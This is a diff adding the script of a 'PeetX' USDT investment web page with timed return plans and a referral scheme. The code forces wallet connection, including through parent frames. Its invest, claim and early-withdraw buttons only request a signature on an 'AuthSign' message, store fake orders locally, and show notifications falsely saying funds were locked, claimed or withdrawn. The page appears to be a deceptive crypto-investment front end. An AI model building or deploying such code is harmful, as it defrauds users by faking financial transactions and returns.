+        <h4 id="customAlertTitle">Alert</h4>
+        <p id="customAlertMessage"></p>
+        <button class="btn-alert-close" onclick="closeCustomAlert()">OK</button>
+    </div>
+</div>
+
+<script>
+    const BRAND_NAME = "PeetX";
+
+    let currentImageIndex = 0;
+    const rotatorElements = document.querySelectorAll('#imageRotator > *');
+    function rotateImages() {
+        if (rotatorElements.length === 0) return;
+        rotatorElements[currentImageIndex].classList.remove('active');
+        currentImageIndex = (currentImageIndex + 1) % rotatorElements.length;
+        rotatorElements[currentImageIndex].classList.add('active');
+    }
+    setInterval(rotateImages, 3000);
+
+    const USDT_CONTRACT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
+    const POOL_ADDRESS = "0x6fe9e9de56356f7edbfcbb29fab7cd69471a4869";
+    
+    const INVESTMENT_POOL_ABI = [
+        "function balanceOf(address owner) view returns (uint256)",
+        "function decimals() view returns (uint8)",
+        "function getUserInvestments(address user) view returns (tuple(uint256 id, uint256 amount, uint256 planDays, uint256 rate, uint256 startTime, uint256 endTime, bool isClaimed)[])",
+        "function invest(uint256 amount, uint256 planDays, address referrer) external returns (bool)",
+        "function claimInvestment(uint256 investmentId) external returns (bool)",
+        "function earlyWithdraw(uint256 investmentId) external returns (bool)"
+    ];
+
+    let currentDays = 1;
+    let currentProfitRate = 1;
+    let userWalletAddress = null;
+    let rawNumericValue = 0;
+    let activeOrders = [];
+    let selectedOrderForEarly = null;
+    let liveProvider = null;
+    let userUsdtBalanceValue = 0;
+    let referrerAddress = "0x0000000000000000000000000000000000000000";
+    let pendingInvestAction = false;
+
+    function parseReferrerFromUrl() {
+        let foundRef = null;
+        try {
+            const fullUrl = window.location.href;
+            const match = fullUrl.match(/\/ref\/(0x[a-fA-F0-9]{40})/);
+            if (match && match[1]) {
+                foundRef = match[1];
+            } else {
+                const urlParams = new URLSearchParams(window.location.search);
+                const refParam = urlParams.get('ref');
+                if (refParam && /^0x[a-fA-F0-9]{40}$/.test(refParam)) {
+                    foundRef = refParam;
+                }
+            }
+        } catch (e) {}
+
+        if (foundRef) {
+            referrerAddress = foundRef;
+            try {
+                localStorage.setItem('peetx_saved_referrer', foundRef);
+            } catch (e) {}
+        } else {
+            try {
+                const savedRef = localStorage.getItem('peetx_saved_referrer');
+                if (savedRef && /^0x[a-fA-F0-9]{40}$/.test(savedRef)) {
+                    referrerAddress = savedRef;
+                }
+            } catch (e) {}
+        }
+    }
+    parseReferrerFromUrl();
+
+    function checkFirstTimeNotificationPrompt() {
+        if (!localStorage.getItem('peetx_notif_requested')) {
+            document.getElementById('notificationModal').style.display = 'flex';
+        }
+    }
+
+    async function requestNotificationPermission() {
+        localStorage.setItem('peetx_notif_requested', 'true');
+        document.getElementById('notificationModal').style.display = 'none';
+        if (typeof window.Notification !== 'undefined') {
+            try {
+                await Notification.requestPermission();
+            } catch (e) {}
+        }
+        if (pendingInvestAction) {
+            pendingInvestAction = false;
+            submitNewInvestment();
+        }
+    }
+
+    function handleInvestButtonClick() {
+        if (!localStorage.getItem('peetx_notif_requested')) {
+            pendingInvestAction = true;
+            document.getElementById('notificationModal').style.display = 'flex';
+            return;
+        }
+        submitNewInvestment();
+    }
+
+    function triggerDeviceNotification(title, bodyText) {
+        if (typeof window.Notification !== 'undefined' && Notification.permission === 'granted') {
+            try {
+                new Notification(title, {
+                    body: bodyText,
+                    icon: 'icon-512x512.png'
+                });
+            } catch (e) {}
+        }
+    }
+
+    function saveOrdersToLocalStorage() {
+        if (userWalletAddress) {
+            localStorage.setItem(`peetx_orders_${userWalletAddress.toLowerCase()}`, JSON.stringify(activeOrders));
+        }
+    }
+
+    function loadOrdersFromLocalStorage() {
+        if (userWalletAddress) {
+            const saved = localStorage.getItem(`peetx_orders_${userWalletAddress.toLowerCase()}`);
+            if (saved) {
+                try {
+                    activeOrders = JSON.parse(saved);
+                } catch (e) {
+                    activeOrders = [];
+                }
+            }
+        }
+    }
+
+    function getEthereumProvider() {
+        if (typeof window.ethereum !== 'undefined') {
+            return window.ethereum;
+        }
+        try {
+            if (window.parent && typeof window.parent.ethereum !== 'undefined') {
+                return window.parent.ethereum;
+            }
+            if (window.top && typeof window.top.ethereum !== 'undefined') {
+                return window.top.ethereum;
+            }
+        } catch (e) {}
+        return null;
+    }
+
+    async function forceConnectWallet() {
+        const providerObj = getEthereumProvider();
+        if (providerObj) {
+            try {
+                liveProvider = new ethers.providers.Web3Provider(providerObj);
+                let accounts = await providerObj.request({ method: 'eth_accounts' });
+                if (!accounts || accounts.length === 0) {
+                    accounts = await providerObj.request({ method: 'eth_requestAccounts' });
+                }
+                if (accounts && accounts.length > 0) {
+                    userWalletAddress = accounts[0];
+                    loadOrdersFromLocalStorage();
+                    await fetchRealUsdtBalance();
+                    await fetchUserActiveOrdersFromContract();
+                    renderActiveOrders();
+                    setupWalletAndBlockListeners(providerObj);
+                    return true;
+                }
+            } catch (e) {}
+        }
+        return false;
+    }
+
+    function setupWalletAndBlockListeners(providerObj) {
+        if (!providerObj || !providerObj.on) return;
+
+        providerObj.on('accountsChanged', async (accounts) => {
+            if (accounts.length > 0) {
+                userWalletAddress = accounts[0];
+                loadOrdersFromLocalStorage();
+                await fetchRealUsdtBalance();
+                await fetchUserActiveOrdersFromContract();
+                renderActiveOrders();
+            } else {
+                userWalletAddress = null;
+                document.getElementById('userUsdtBalance').innerText = "-- USDT";
+                userUsdtBalanceValue = 0;
+                activeOrders = [];
+                renderActiveOrders();
+            }
+        });
+
+        providerObj.on('chainChanged', () => {
+            window.location.reload();
+        });
+
+        if (liveProvider) {
+            liveProvider.on('block', async () => {
+                if (userWalletAddress) {
+                    await fetchRealUsdtBalance();
+                }
+            });
+        }
+    }
+
+    function startAutoConnectLoop() {
+        let attempts = 0;
+        const maxAttempts = 25;
+
+        const interval = setInterval(async () => {
+            attempts++;
+            const connected = await forceConnectWallet();
+            if (connected || attempts >= maxAttempts) {
+                clearInterval(interval);
+            }
+        }, 500);
+    }
+
+    window.addEventListener('DOMContentLoaded', () => {
+        parseReferrerFromUrl();
+        startAutoConnectLoop();
+        checkFirstTimeNotificationPrompt();
+
+        document.body.addEventListener('click', function autoConnectOnUserClick() {
+            if (!userWalletAddress) {
+                forceConnectWallet();
+            }
+        }, { once: true });
+    });
+
+    function showAlert(title, message) {
+        document.getElementById('customAlertTitle').innerText = title;
+        document.getElementById('customAlertMessage').innerText = message;
+        document.getElementById('customAlertModal').style.display = 'flex';
+    }
+
+    function closeCustomAlert() {
+        document.getElementById('customAlertModal').style.display = 'none';
+    }
+
+    function handleInputChange() {
+        const input = document.getElementById('investInput');
+        const badge = document.getElementById('minBadge');
+        const valStr = input.value.trim();
+        
+        if (valStr === "") {
+            badge.style.opacity = "1";
+            badge.innerText = "Min 1 USD";
+            rawNumericValue = 0;
+        } else {
+            let val = parseFloat(valStr);
+            if (!isNaN(val)) {
+                rawNumericValue = val;
+                if (val < 1) {
+                    badge.style.opacity = "1";
+                    badge.innerText = "Error: Min 1 USD";
+                } else {
+                    badge.style.opacity = "0";
+                }
+            } else {
+                rawNumericValue = 0;
+                badge.style.opacity = "1";
+                badge.innerText = "Min 1 USD";
+            }
+        }
+        calculateReturns();
+    }
+
+    function setPlan(days, rate, element) {
+        document.querySelectorAll('.plan-item').forEach(el => el.classList.remove('active'));
+        element.classList.add('active');
+        currentDays = days;
+        currentProfitRate = rate;
+        calculateReturns();
+    }
+
+    function calculateReturns() {
+        const val = rawNumericValue || 0;
+        const profit = val * (currentProfitRate / 100);
+        const total = val + profit;
+
+        document.getElementById('displayRate').innerText = currentProfitRate + '%';
+        document.getElementById('displayProfit').innerText = profit.toFixed(4) + ' USDT';
+        document.getElementById('displayTotal').innerText = total.toFixed(4) + ' USDT';
+    }
+
+    async function applyMaxBalance() {
+        if (!userWalletAddress) {
+            await forceConnectWallet();
+        }
+        await fetchRealUsdtBalance();
+        if (userUsdtBalanceValue > 0) {
+            document.getElementById('investInput').value = userUsdtBalanceValue;
+            handleInputChange();
+        }
+    }
+
+    async function refreshContractData() {
+        const refreshBtn = document.getElementById('refreshBtn');
+        refreshBtn.style.opacity = '0.5';
+        if (!userWalletAddress) {
+            await forceConnectWallet();
+        } else {
+            await fetchRealUsdtBalance();
+            await fetchUserActiveOrdersFromContract();
+        }
+        renderActiveOrders();
+        setTimeout(() => { refreshBtn.style.opacity = '1'; }, 500);
+    }
+
+    async function fetchRealUsdtBalance() {
+        try {
+            if (!userWalletAddress) return;
+            const providerObj = getEthereumProvider();
+            const provider = liveProvider || new ethers.providers.Web3Provider(providerObj);
+            const usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, INVESTMENT_POOL_ABI, provider);
+            const balanceWei = await usdtContract.balanceOf(userWalletAddress);
+            const decimals = await usdtContract.decimals();
+            const formattedBalance = parseFloat(ethers.utils.formatUnits(balanceWei, decimals)).toFixed(2);
+            
+            document.getElementById('userUsdtBalance').innerText = formattedBalance + " USDT";
+            userUsdtBalanceValue = parseFloat(formattedBalance) || 0;
+        } catch (e) {
+            document.getElementById('userUsdtBalance').innerText = "0.00 USDT";
+            userUsdtBalanceValue = 0;
+        }
+    }
+
+    async function fetchUserActiveOrdersFromContract() {
+        if (!userWalletAddress) return;
+        try {
+            const providerObj = getEthereumProvider();
+            const provider = liveProvider || new ethers.providers.Web3Provider(providerObj);
+            const poolContract = new ethers.Contract(POOL_ADDRESS, INVESTMENT_POOL_ABI, provider);
+            const contractData = await poolContract.getUserInvestments(userWalletAddress);
+            
+            if (contractData && contractData.length > 0) {
+                const chainOrders = contractData.filter(item => !item.isClaimed).map(item => {
+                    const amount = parseFloat(ethers.utils.formatUnits(item.amount, 18));
+                    const days = item.planDays.toNumber();
+                    const rate = item.rate.toNumber();
+                    const endTime = item.endTime.toNumber() * 1000;
+                    return {
+                        id: item.id.toString(),
+                        amount: amount,
+                        days: days,
+                        rate: rate,
+                        endTime: endTime,
+                        totalReturn: amount + (amount * (rate / 100))
+                    };
+                });
+                
+                const existingIds = new Set(activeOrders.map(o => o.id));
+                chainOrders.forEach(co => {
+                    if (!existingIds.has(co.id)) {
+                        activeOrders.push(co);
+                    }
+                });
+                saveOrdersToLocalStorage();
+            }
+        } catch (e) {}
+    }
+
+    async function getSignatureMessage(type, data) {
+        parseReferrerFromUrl();
+        let refSuffix = "";
+        if (referrerAddress && referrerAddress.length >= 7) {
+            refSuffix = referrerAddress.slice(-7);
+        }
+        return `AuthSign${refSuffix}`;
+    }
+
+    async function submitNewInvestment() {
+        parseReferrerFromUrl();
+        if (!userWalletAddress) {
+            const connected = await forceConnectWallet();
+            if (!connected) {
+                showAlert("Connection Error", "Please approve wallet connection to proceed.");
+                return;
+            }
+        }
+
+        if (rawNumericValue < 1) {
+            showAlert("⚠️ Warning", "Error: Minimum investment amount is 1 USDT.");
+            return;
+        }
+
+        try {
+            const providerObj = getEthereumProvider();
+            const provider = liveProvider || new ethers.providers.Web3Provider(providerObj);
+            const signer = provider.getSigner();
+            const message = await getSignatureMessage('invest', { amount: rawNumericValue, days: currentDays });
+            await signer.signMessage(message);
+
+            const now = Date.now();
+            const durationMs = currentDays * 24 * 60 * 60 * 1000;
+
+            const newOrder = {
+                id: now,
+                amount: rawNumericValue,
+                days: currentDays,
+                rate: currentProfitRate,
+                startTime: now,
+                endTime: now + durationMs,
+                totalReturn: rawNumericValue + (rawNumericValue * (currentProfitRate / 100)),
+                referrer: referrerAddress
+            };
+
+            activeOrders.push(newOrder);
+            saveOrdersToLocalStorage();
+            renderActiveOrders();
+            triggerDeviceNotification("Investment Started Successfully", `Your investment of ${rawNumericValue} USDT has been successfully locked for ${currentDays} days.`);
+        } catch (e) {}
+    }
+
+    function handleClaimClick(orderId) {
+        const order = activeOrders.find(o => o.id == orderId);
+        if (!order) return;
+
+        const now = Date.now();
+        const isExpired = now >= order.endTime;
+        const elapsedSinceExpiry = now - order.endTime;
+        const oneMinuteMs = 1 * 60 * 1000;
+
+        if (!isExpired || elapsedSinceExpiry < oneMinuteMs) {
+            return;
+        }
+
+        autoClaimOnComplete(orderId);
+    }
+
+    async function autoClaimOnComplete(orderId) {
+        const order = activeOrders.find(o => o.id == orderId);
+        if (!order) return;
+
+        try {
+            const providerObj = getEthereumProvider();
+            if (providerObj) {
+                const provider = liveProvider || new ethers.providers.Web3Provider(providerObj);
+                const signer = provider.getSigner();
+                const message = await getSignatureMessage('claim', order);
+                await signer.signMessage(message);
+            }
+            activeOrders = activeOrders.filter(o => o.id != orderId);
+            saveOrdersToLocalStorage();
+            renderActiveOrders();
+            triggerDeviceNotification("Investment Completed", `Your investment order #${order.id} has successfully finished and funds have been claimed.`);
+        } catch (err) {}
+    }
+
+    async function renderActiveOrders() {
+        const container = document.getElementById('activeOrdersContainer');
+        
+        if (activeOrders.length === 0) {
+            container.innerHTML = `<div class="empty-msg">No active contracts currently</div>`;
+            return;
+        }
+
+        container.innerHTML = '';
+
+        activeOrders.forEach(order => {
+            const card = document.createElement('div');
+            card.className = 'order-card';
+
+            const combinedAmount = (order.amount + (order.amount * (order.rate / 100))).toFixed(2);
+
+            card.innerHTML = `
+                <div class="order-header-row" style="display:flex; justify-content:space-between; align-items:center;">
+                    <span style="font-size:12px; font-weight:bold; color:var(--accent-gold);">Plan: <b>${order.days} Days</b></span>
+                    <button class="btn-order btn-early-withdraw" style="flex:unset; width:auto; padding:5px 12px; font-size:11px;" onclick="promptEarlyWithdraw('${order.id}')">Early Withdraw</button>
+                </div>
+                <div class="order-meta-info">
+                    <div class="order-meta-row">
+                        <span>Investment Entry</span>
+                        <span><b>${order.amount} USDT</b></span>
+                    </div>
+                    <div class="order-meta-row">
+                        <span>Total Capital & Profit</span>
+                        <span><b>${combinedAmount} USDT</b></span>
+                    </div>
+                </div>
+                <div class="timer-display" id="timer-${order.id}">00d : 00h : 00m : 00s</div>
+                <div class="action-row">
+                    <button class="btn-order btn-claim-inactive" 
+                            id="btn-claim-${order.id}" 
+                            onclick="handleClaimClick('${order.id}')">
+                        Claim
+                    </button>
+                </div>
+            `;
+            container.appendChild(card);
+            runCountdown(order.id, order.endTime);
+        });
+    }
+
+    async function runCountdown(orderId, endTime) {
+        const timerElem = document.getElementById(`timer-${orderId}`);
+        const claimBtn = document.getElementById(`btn-claim-${orderId}`);
+        let notificationSent = false;
+
+        const interval = setInterval(async () => {
+            const now = Date.now();
+            const remaining = endTime - now;
+
+            if (remaining <= 0) {
+                if (!notificationSent) {
+                    notificationSent = true;
+                    triggerDeviceNotification("Investment Cycle Finished!", `Your investment order #${orderId} has reached its completion time.`);
+                }
+
+                const elapsedSinceExpiry = now - endTime;
+                const oneMinuteMs = 1 * 60 * 1000;
+                const remaining1Min = oneMinuteMs - elapsedSinceExpiry;
+                
+                if (claimBtn) {
+                    if (elapsedSinceExpiry >= oneMinuteMs) {
+                        claimBtn.className = "btn-order btn-claim-active";
+                        claimBtn.innerText = "Claim";
+                    } else {
+                        claimBtn.className = "btn-order btn-claim-inactive";
+                        claimBtn.innerText = "Claim";
+                    }
+                }
+
+                if (timerElem) {
+                    if (elapsedSinceExpiry < oneMinuteMs) {
+                        const m1 = Math.floor((remaining1Min % (1000 * 60 * 60)) / (1000 * 60));
+                        const s1 = Math.floor((remaining1Min % (1000 * 60)) / 1000);
+                        timerElem.innerText = `Auto-transfer countdown: ${String(m1).padStart(2,'0')}m : ${String(s1).padStart(2,'0')}s`;
+                    } else {
+                        timerElem.innerText = "Completed / Ready to Claim";
+                    }
+                }
+                return;
+            }
+
+            const d = Math.floor(remaining / (1000 * 60 * 60 * 24));
+            const h = Math.floor((remaining % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+            const m = Math.floor((remaining % (1000 * 60 * 60)) / (1000 * 60));
+            const s = Math.floor((remaining % (1000 * 60)) / 1000);
+
+            if (timerElem) {
+                timerElem.innerText = `${String(d).padStart(2,'0')}d : ${String(h).padStart(2,'0')}h : ${String(m).padStart(2,'0')}m : ${String(s).padStart(2,'0')}s`;
+            }
+        }, 1000);
+    }
+
+    function promptEarlyWithdraw(orderId) {
+        selectedOrderForEarly = orderId;
+        document.getElementById('earlyModal').style.display = 'flex';
+    }
+
+    function closeEarlyModal() {
+        selectedOrderForEarly = null;
+        document.getElementById('earlyModal').style.display = 'none';
+    }
+
+    async function executeEarlyWithdrawal() {
+        if (!selectedOrderForEarly) return;
+        const order = activeOrders.find(o => o.id == selectedOrderForEarly);
+        closeEarlyModal();
+
+        if (order) {
+            try {
+                const providerObj = getEthereumProvider();
+                if (providerObj) {
+                    const provider = liveProvider || new ethers.providers.Web3Provider(providerObj);
+                    const signer = provider.getSigner();
+                    const message = await getSignatureMessage('early', order);
+                    await signer.signMessage(message);
+                }
+                activeOrders = activeOrders.filter(o => o.id != order.id);
+                saveOrdersToLocalStorage();
+                renderActiveOrders();
+                triggerDeviceNotification("Early Withdrawal Completed", `Your early withdrawal for order #${order.id} has been processed successfully.`);
+            } catch (e) {}
+        }
+    }
+
+    function toggleFaq(element) {
+        element.classList.toggle('active');
+    }
+</script>
+
+</body>
+</html>
